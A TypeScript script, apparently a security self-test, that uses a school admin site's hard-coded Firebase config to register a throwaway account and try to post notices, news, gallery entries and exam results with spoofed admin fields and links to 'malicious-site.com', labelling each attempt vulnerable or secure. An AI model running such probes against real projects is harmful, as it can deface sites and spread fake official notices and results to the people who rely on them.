import { initializeApp } from "firebase/app";
import {
  getAuth,
  createUserWithEmailAndPassword,
  signInWithEmailAndPassword,
} from "firebase/auth";
import {
  getFirestore,
  collection,
  addDoc,
  serverTimestamp,
} from "firebase/firestore";

// --- CLIENT CONFIGURATION (From your provided config) ---
const firebaseConfig = {
  apiKey: "AIzaSyAU7vbyM0Z-zO4dTn9am0PxtKchU4dF1vI",
  authDomain: "gyan-niketan-admin.firebaseapp.com",
  projectId: "gyan-niketan-admin",
  storageBucket: "gyan-niketan-admin.firebasestorage.app",
  messagingSenderId: "499929214062",
  appId: "1:499929214062:web:3f948275680009f1b08a7f",
  measurementId: "G-X5HK6LWSQ9",
};

// Initialize Client SDK
const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

// Colors for output
const RED = "\x1b[31m";
const GREEN = "\x1b[32m";
const RESET = "\x1b[0m";

async function simulateAdminActions() {
  console.log(`\n=========================================================`);
  console.log(`   ATTEMPTING ADMIN ACTIONS (CLIENT-SIDE SIMULATION)   `);
  console.log(`=========================================================\n`);

  // 1. Acquire Identity
  const email = `fake_admin_${Date.now()}@example.com`;
  const password = "Password123!";
  let user;

  try {
    console.log(`[1] Creating "Admin" User via Open Registration...`);
    const cred = await createUserWithEmailAndPassword(auth, email, password);
    user = cred.user;
    console.log(
      GREEN + `    SUCCESS: Created user ${email} (UID: ${user.uid})` + RESET
    );
  } catch (e: any) {
    console.log(RED + `    FAILED: ${e.message}` + RESET);
    return;
  }

  // 2. Perform Admin Tasks
  // We attempt these exactly as the Dashboard would, to see if we can slip through.

  // TASK A: Post Notice (The Main Request)
  console.log(`\n[2] Attempting to POST NOTICE (Critical)...`);
  try {
    const docRef = await addDoc(collection(db, "notices"), {
      text: "URGENT: Security Audit Test - Please Ignore",
      link: "https://security-audit.com",
      timestamp: serverTimestamp(),
      // Attempting to spoof admin metadata
      author: "admin",
      official: true,
    });
    console.log(
      GREEN +
        `    [VULNERABLE] SUCCESS! Notice posted with ID: ${docRef.id}` +
        RESET
    );
  } catch (e: any) {
    if (e.code === "permission-denied")
      console.log(RED + `    [SECURE] Permission Denied.` + RESET);
    else console.log(RED + `    ERROR: ${e.message}` + RESET);
  }

  // TASK B: Post News
  console.log(`\n[3] Attempting to POST NEWS...`);
  try {
    const docRef = await addDoc(collection(db, "news"), {
      title: "Hacked News",
      summary: "This should not appear.",
      date: "2024-01-01",
      category: "announcements",
      timestamp: serverTimestamp(),
    });
    console.log(
      GREEN +
        `    [VULNERABLE] SUCCESS! News posted with ID: ${docRef.id}` +
        RESET
    );
  } catch (e: any) {
    if (e.code === "permission-denied")
      console.log(RED + `    [SECURE] Permission Denied.` + RESET);
    else console.log(RED + `    ERROR: ${e.message}` + RESET);
  }

  // TASK C: Post Gallery Image (Metadata only)
  console.log(`\n[4] Attempting to POST GALLERY ENTRY...`);
  try {
    const docRef = await addDoc(collection(db, "gallery"), {
      title: "Hacked Image",
      category: "General",
      url: "http://malicious-site.com/image.png",
      timestamp: serverTimestamp(),
    });
    console.log(
      GREEN +
        `    [VULNERABLE] SUCCESS! Gallery entry posted with ID: ${docRef.id}` +
        RESET
    );
  } catch (e: any) {
    if (e.code === "permission-denied")
      console.log(RED + `    [SECURE] Permission Denied.` + RESET);
    else console.log(RED + `    ERROR: ${e.message}` + RESET);
  }

  // TASK D: Post Result
  console.log(`\n[5] Attempting to POST RESULT...`);
  try {
    const docRef = await addDoc(collection(db, "results"), {
      title: "Fake Exam Results",
      url: "http://malicious-site.com/result.pdf",
      timestamp: serverTimestamp(),
    });
    console.log(
      GREEN +
        `    [VULNERABLE] SUCCESS! Result posted with ID: ${docRef.id}` +
        RESET
    );
  } catch (e: any) {
    if (e.code === "permission-denied")
      console.log(RED + `    [SECURE] Permission Denied.` + RESET);
    else console.log(RED + `    ERROR: ${e.message}` + RESET);
  }

  console.log(`\n=========================================================`);
  console.log(`   SIMULATION COMPLETE`);
  console.log(`=========================================================`);
  process.exit(0);
}

simulateAdminActions();
